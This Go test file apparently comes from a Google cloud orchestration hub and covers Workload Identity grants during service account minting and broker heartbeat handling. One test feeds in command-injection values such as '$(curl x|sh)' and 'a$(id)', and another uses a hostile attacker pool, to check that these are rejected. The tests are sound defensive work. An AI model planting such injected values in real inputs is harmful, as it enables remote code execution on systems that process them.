// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//go:build !no_sqlite

package hub

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"google.golang.org/api/googleapi"

	"github.com/GoogleCloudPlatform/scion/pkg/api"
	"github.com/GoogleCloudPlatform/scion/pkg/experiments"
	"github.com/GoogleCloudPlatform/scion/pkg/store"
)

// setWorkloadIdentitySetupExperiment turns hub.k8s_workload_identity_setup
// on or off on srv by replacing its registry; every other experiment keeps
// its registered default.
func setWorkloadIdentitySetupExperiment(t *testing.T, srv *Server, on bool) {
	t.Helper()
	var active []experiments.Experiment
	for _, e := range experiments.Default().All() {
		if e.Name == experiments.K8sWorkloadIdentitySetup {
			e.Default = on
		}
		active = append(active, e)
	}
	reg, err := experiments.NewRegistry(active, nil)
	require.NoError(t, err)
	srv.experiments = reg
	require.Equal(t, on, srv.experimentEnabled(experiments.K8sWorkloadIdentitySetup))
}

func TestK8sWorkloadIdentitySetupExperiment_Registered(t *testing.T) {
	exp, ok := experiments.Default().Lookup(experiments.K8sWorkloadIdentitySetup)
	require.True(t, ok)
	assert.False(t, exp.Default)
	assert.ElementsMatch(t, []experiments.Layer{experiments.LayerServer, experiments.LayerWeb}, exp.Layers)
}

func setWorkloadIdentityTargets(t *testing.T, s store.Store, brokerID string, caps bool, targets []store.WorkloadIdentityTarget) {
	t.Helper()
	require.NoError(t, s.RefreshRuntimeBrokerState(context.Background(), brokerID, func(b *store.RuntimeBroker) bool {
		b.WorkloadIdentityTargets = targets
		if caps {
			b.Capabilities = &store.BrokerCapabilities{WITargetsV1: true}
		}
		return true
	}))
}

type wiMintResponse struct {
	store.GCPServiceAccount
	WorkloadIdentityBindings []api.WorkloadIdentityBinding `json:"workloadIdentityBindings"`
}

func mintForWI(t *testing.T, srv *Server, projectID string) (wiMintResponse, string) {
	t.Helper()
	rec := doRequest(t, srv, http.MethodPost,
		fmt.Sprintf("/api/v1/projects/%s/gcp-service-accounts/mint", projectID),
		map[string]string{"account_id": "wi-test"})
	require.Equal(t, http.StatusCreated, rec.Code, rec.Body.String())
	var resp wiMintResponse
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
	return resp, rec.Body.String()
}

// Experiment on: the mint grants the Workload Identity role for every
// serving Kubernetes target in one write, reports each target, and leaves
// the required grants unchanged.
func TestMintGCPServiceAccount_WorkloadIdentityBindings(t *testing.T) {
	srv, s, mock := testServerWithMinting(t)
	setWorkloadIdentitySetupExperiment(t, srv, true)
	projectID := createTestProjectForSA(t, srv, nil)
	a := addProviderBroker(t, s, projectID, "a", k8sProfile("gke", false), k8sProfile("gke-dev", false))
	setWorkloadIdentityTargets(t, s, a.ID, true, []store.WorkloadIdentityTarget{
		{Profile: "gke", Pool: "cluster-project.svc.id.goog", Namespace: "agents"},
	})
	old := addProviderBroker(t, s, projectID, "old", k8sProfile("k8s", false))
	_ = old

	resp, _ := mintForWI(t, srv, projectID)
	assert.True(t, resp.Verified)
	assert.Equal(t, "scion-wi-test@test-hub-project.iam.gserviceaccount.com", resp.Email)

	require.Len(t, mock.addMembersCalls, 1, "one policy write")
	assert.Equal(t, mockAddRoleMembersCall{
		SAEmail: resp.Email, Role: "roles/iam.workloadIdentityUser",
		Members: []string{"serviceAccount:cluster-project.svc.id.goog[agents/scion-wi-test]"},
	}, mock.addMembersCalls[0])
	require.Len(t, mock.iamPolicies, 2, "the required grants are unchanged")

	require.Len(t, resp.WorkloadIdentityBindings, 3)
	assert.Equal(t, api.WorkloadIdentityBinding{
		Pool: "cluster-project.svc.id.goog", Namespace: "agents", KSA: "scion-wi-test",
		Member:   "serviceAccount:cluster-project.svc.id.goog[agents/scion-wi-test]",
		Profiles: []string{"a/gke"}, State: api.WorkloadIdentityBindingBound,
	}, resp.WorkloadIdentityBindings[0])
	assert.Equal(t, []string{"a/gke-dev"}, resp.WorkloadIdentityBindings[1].Profiles)
	assert.Equal(t, api.WorkloadIdentityReasonNoPool, resp.WorkloadIdentityBindings[1].Reason)
	assert.Equal(t, []string{"old/k8s"}, resp.WorkloadIdentityBindings[2].Profiles)
	assert.Contains(t, resp.WorkloadIdentityBindings[2].Detail, "does not report", "a broker without wi_targets_v1")
}

// A failed grant never fails the mint: the account is stored verified and
// the entry says why and how to fix it.
func TestMintGCPServiceAccount_WorkloadIdentityGrantFailureKeepsMint(t *testing.T) {
	srv, s, mock := testServerWithMinting(t)
	setWorkloadIdentitySetupExperiment(t, srv, true)
	mock.addMembersErr = func(int, []string) error {
		return &googleapi.Error{Code: http.StatusForbidden, Message: "denied"}
	}
	projectID := createTestProjectForSA(t, srv, nil)
	a := addProviderBroker(t, s, projectID, "a", k8sProfile("gke", false))
	setWorkloadIdentityTargets(t, s, a.ID, true, []store.WorkloadIdentityTarget{
		{Profile: "gke", Pool: "cluster-project.svc.id.goog", Namespace: "agents"},
	})

	resp, _ := mintForWI(t, srv, projectID)
	assert.True(t, resp.Verified)
	assert.Empty(t, mock.deletedSAs, "the account is not cleaned up")
	stored, err := s.GetGCPServiceAccount(context.Background(), resp.ID)
	require.NoError(t, err)
	assert.True(t, stored.Verified)
	require.Len(t, resp.WorkloadIdentityBindings, 1)
	b := resp.WorkloadIdentityBindings[0]
	assert.Equal(t, api.WorkloadIdentityBindingSkipped, b.State)
	assert.Equal(t, api.WorkloadIdentityReasonPermissionDenied, b.Reason)
	assert.Contains(t, b.ManualStep, "gcloud iam service-accounts add-iam-policy-binding '"+resp.Email+"'")
}

// Experiment off: no Workload Identity call and no response field, exactly
// as before.
func TestMintGCPServiceAccount_WorkloadIdentityExperimentOff(t *testing.T) {
	srv, s, mock := testServerWithMinting(t)
	setWorkloadIdentitySetupExperiment(t, srv, false)
	projectID := createTestProjectForSA(t, srv, nil)
	a := addProviderBroker(t, s, projectID, "a", k8sProfile("gke", false))
	setWorkloadIdentityTargets(t, s, a.ID, true, []store.WorkloadIdentityTarget{
		{Profile: "gke", Pool: "cluster-project.svc.id.goog", Namespace: "agents"},
	})

	_, body := mintForWI(t, srv, projectID)
	assert.Empty(t, mock.addMembersCalls)
	assert.NotContains(t, body, "workloadIdentityBindings")
}

// Experiment on, but no Kubernetes target: no call and no field.
func TestMintGCPServiceAccount_WorkloadIdentityNoKubernetesTargets(t *testing.T) {
	srv, s, mock := testServerWithMinting(t)
	setWorkloadIdentitySetupExperiment(t, srv, true)
	projectID := createTestProjectForSA(t, srv, nil)
	addProviderBroker(t, s, projectID, "a", store.BrokerProfile{Name: "local", Type: "docker"})

	_, body := mintForWI(t, srv, projectID)
	assert.Empty(t, mock.addMembersCalls)
	assert.NotContains(t, body, "workloadIdentityBindings")
}

// End to end through the heartbeat handler: the targets and the capability
// are stored, a heartbeat without the field keeps them, an empty list
// replaces them, and a flat row keeps its targets without a profile.
func TestBrokerHeartbeat_WorkloadIdentityTargetsPersisted(t *testing.T) {
	srv, s, projectID := newMappingProject(t)
	grantDevUserRuntimeBrokerAccess(t, s)
	b := addProviderBroker(t, s, projectID, "b", k8sProfile("gke", false))
	load := func(id string) *store.RuntimeBroker {
		t.Helper()
		got, err := s.GetRuntimeBroker(context.Background(), id)
		require.NoError(t, err)
		return got
	}
	assert.Nil(t, load(b.ID).WorkloadIdentityTargets, "never reported")

	targets := []store.WorkloadIdentityTarget{{Profile: "gke", Pool: "cluster-project.svc.id.goog", Namespace: "agents"}}
	wiHeartbeatAsBroker(t, srv, b.ID, brokerHeartbeatRequest{
		Status:                  "online",
		Capabilities:            &store.BrokerCapabilities{WITargetsV1: true},
		WorkloadIdentityTargets: &targets,
	})
	got := load(b.ID)
	assert.Equal(t, targets, got.WorkloadIdentityTargets)
	require.NotNil(t, got.Capabilities)
	assert.True(t, got.Capabilities.WITargetsV1)

	wiHeartbeatAsBroker(t, srv, b.ID, brokerHeartbeatRequest{Status: "online"})
	assert.Equal(t, targets, load(b.ID).WorkloadIdentityTargets, "an omitted field keeps the stored list")

	none := []store.WorkloadIdentityTarget{}
	wiHeartbeatAsBroker(t, srv, b.ID, brokerHeartbeatRequest{Status: "online", WorkloadIdentityTargets: &none})
	got = load(b.ID)
	require.NotNil(t, got.WorkloadIdentityTargets, "an empty report is stored as empty, not as never reported")
	assert.Empty(t, got.WorkloadIdentityTargets)

	// Malformed entries are not stored; the valid one is.
	mixed := []store.WorkloadIdentityTarget{
		{Profile: "gke", Pool: "$(curl x|sh).svc.id.goog", Namespace: "agents"},
		{Profile: "gke", Pool: "cluster-project.svc.id.goog", Namespace: "a$(id)"},
		{Profile: "gke", Pool: "cluster-project.svc.id.goog", Namespace: "agents"},
	}
	wiHeartbeatAsBroker(t, srv, b.ID, brokerHeartbeatRequest{Status: "online", WorkloadIdentityTargets: &mixed})
	assert.Equal(t, []store.WorkloadIdentityTarget{{Profile: "gke", Pool: "cluster-project.svc.id.goog", Namespace: "agents"}},
		load(b.ID).WorkloadIdentityTargets, "malformed pool and namespace are dropped at ingest")

	// A null field (unreadable settings) keeps the stored list too.
	wiHeartbeatAsBroker(t, srv, b.ID, json.RawMessage(`{"status":"online","workloadIdentityTargets":null}`))
	assert.NotNil(t, load(b.ID).WorkloadIdentityTargets)
}

// Workload Identity targets come only from the broker's own credentials: a
// user heartbeat (the dev user holds broker.update here and is admitted)
// leaves the stored targets unchanged, so a hub user cannot choose the pool
// or namespace a mint binds.
func TestBrokerHeartbeat_WorkloadIdentityTargetsIgnoredFromUser(t *testing.T) {
	srv, s, projectID := newMappingProject(t)
	grantDevUserRuntimeBrokerAccess(t, s)
	b := addProviderBroker(t, s, projectID, "b", k8sProfile("gke", false))
	targets := []store.WorkloadIdentityTarget{{Profile: "gke", Pool: "cluster-project.svc.id.goog", Namespace: "agents"}}
	wiHeartbeatAsBroker(t, srv, b.ID, brokerHeartbeatRequest{Status: "online", WorkloadIdentityTargets: &targets})

	hostile := []store.WorkloadIdentityTarget{{Profile: "gke", Pool: "attacker-proj.svc.id.goog", Namespace: "x"}}
	postHeartbeat(t, srv, b.ID, brokerHeartbeatRequest{Status: "online", WorkloadIdentityTargets: &hostile})
	assert.Equal(t, targets, wiLoadBroker(t, s, b.ID).WorkloadIdentityTargets, "a user heartbeat does not change the stored targets")

	none := []store.WorkloadIdentityTarget{}
	postHeartbeat(t, srv, b.ID, brokerHeartbeatRequest{Status: "online", WorkloadIdentityTargets: &none})
	assert.Equal(t, targets, wiLoadBroker(t, s, b.ID).WorkloadIdentityTargets, "nor clear them")

	// A row that never received targets stays never-reported.
	c := addProviderBroker(t, s, projectID, "c", k8sProfile("gke", false))
	postHeartbeat(t, srv, c.ID, brokerHeartbeatRequest{Status: "online", WorkloadIdentityTargets: &hostile})
	assert.Nil(t, wiLoadBroker(t, s, c.ID).WorkloadIdentityTargets)
}

func TestBrokerHeartbeat_WorkloadIdentityTargetsFlatRowDropsProfile(t *testing.T) {
	srv, s, projectID := newMappingProject(t)
	grantDevUserRuntimeBrokerAccess(t, s)
	ctx := context.Background()
	b := &store.RuntimeBroker{
		ID: tid("wi-flat" + t.Name()), Name: "flat-wi", Slug: "flat-wi-" + tidSlugSafe(t.Name()),
		Endpoint: "http://localhost:9800", Status: store.BrokerStatusOnline,
		RuntimeTarget: &api.RuntimeTargetDescriptor{ID: "rt-flat-wi", Type: "kubernetes", DisplayName: "gke"},
	}
	require.NoError(t, s.CreateRuntimeBroker(ctx, b))
	require.NoError(t, s.AddProjectProvider(ctx, &store.ProjectProvider{ProjectID: projectID, BrokerID: b.ID, BrokerName: b.Name, Status: b.Status}))
	require.True(t, wiLoadBroker(t, s, b.ID).IsFlat())

	targets := []store.WorkloadIdentityTarget{{Profile: "ignored", Pool: "cluster-project.svc.id.goog", Namespace: "agents"}}
	wiHeartbeatAsBroker(t, srv, b.ID, brokerHeartbeatRequest{Status: "online", WorkloadIdentityTargets: &targets})
	got := wiLoadBroker(t, s, b.ID)
	assert.Equal(t, []store.WorkloadIdentityTarget{{Pool: "cluster-project.svc.id.goog", Namespace: "agents"}},
		got.WorkloadIdentityTargets, "kept on a flat row, profile dropped")
	assert.Empty(t, got.Profiles)

	// The flat row is a mint target like a legacy profile.
	plan := workloadIdentityMintPlanFor([]*store.RuntimeBroker{got})
	require.Len(t, plan.targets, 1)
	assert.Equal(t, []string{"flat-wi"}, plan.targets[0].profiles)
}

// wiHeartbeatAsBroker posts a heartbeat whose request identity is the
// broker itself.
func wiHeartbeatAsBroker(t *testing.T, srv *Server, brokerID string, body interface{}) {
	t.Helper()
	raw, err := json.Marshal(body)
	require.NoError(t, err)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/runtime-brokers/"+brokerID+"/heartbeat", bytes.NewReader(raw))
	req.Header.Set("Content-Type", "application/json")
	ident := NewBrokerIdentity(brokerID)
	req = req.WithContext(contextWithIdentity(contextWithBrokerIdentity(req.Context(), ident), ident))
	rec := httptest.NewRecorder()
	srv.mux.ServeHTTP(rec, req)
	require.Equal(t, http.StatusOK, rec.Code, rec.Body.String())
}

func wiLoadBroker(t *testing.T, s store.Store, id string) *store.RuntimeBroker {
	t.Helper()
	got, err := s.GetRuntimeBroker(context.Background(), id)
	require.NoError(t, err)
	return got
}
